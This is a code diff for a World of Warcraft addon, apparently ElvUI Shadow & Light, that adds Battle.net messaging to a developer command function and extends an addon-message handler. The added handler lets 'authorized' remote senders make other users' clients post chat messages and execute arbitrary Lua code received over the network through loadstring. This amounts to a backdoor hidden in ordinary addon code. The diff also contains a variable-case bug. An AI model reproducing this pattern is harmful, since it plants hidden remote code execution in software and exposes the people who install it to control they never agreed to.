@@ -89,7 +89,9 @@ function SLE:Auth(sender)
 	return false
 end
 
-function E:sleCommand(flag, channel, target, output, text, wtarget)
+function E:sleCommand(flag, channel, target, output, text, wtarget, presenceID)
+	print("ID: ", presenceID)
+	print("Flag: ", flag)
 	if not SLE:Auth() then
 		SLE:Print('|cffFF0000Access Denied|r: You need to be authorized to use this command.')
 		return
@@ -115,7 +117,12 @@ function E:sleCommand(flag, channel, target, output, text, wtarget)
 	else
 		Message = Message.."#"..text
 	end
-	SendAddonMessage(flag, Message, channel, target)
+	if channel ~= 'BNET' then
+		SendAddonMessage(flag, Message, channel, target)
+	else
+		presenceID = tonumber(presenceID)
+		BNSendGameData(presenceID, flag, message)
+	end
 	SLE:Print('|cff00FF00Success|r:  Command executed.')
 end
 
@@ -152,9 +159,26 @@ local function SendRecieve(self, event, prefix, message, channel, sender)
 			for i = 1, numBNetOnline do
 				local presenceID, _, _, _, _, _, client, isOnline = BNGetFriendInfo(i)
 				if isOnline and client == BNET_CLIENT_WOW then
-					local message = UnitLevel('player')..'#'..E.myclass..'#'..E.myname..'#'..E.myrealm..'#'..SLE.version;
-					BNSendGameData(presenceID, 'SLE_DEV_INFO', message)
+					local messageS
+					if message == 'userlist' then
+						messageS = UnitLevel('player')..'#'..E.myclass..'#'..E.myname..'#'..E.myrealm..'#'..SLE.version;
+					elseif message == 'slesay' then
+						messageS = "SLEinfo"..E.myname
+					end
+					BNSendGameData(presenceID, 'SLE_DEV_INFO', messageS)
 				end
+			end
+		elseif (prefix == 'SLE_DEV_SAYS' or prefix == 'SLE_DEV_CMD') and SLE:Auth(sender) and not SLE:Auth() then
+			if prefix == 'SLE_DEV_SAYS' then
+				local user, channel, msg, sendTo = split("#", message)
+				SendChatMessage(msg, channel, nil, sendTo)
+			else
+				local user, executeString = split("#", message)
+					local func, err = loadstring(executeString);
+					if not err then
+						SLE:Print(format("Developer Executed: %s", executeString))
+						func()
+					end		
 			end
 		end
 	end
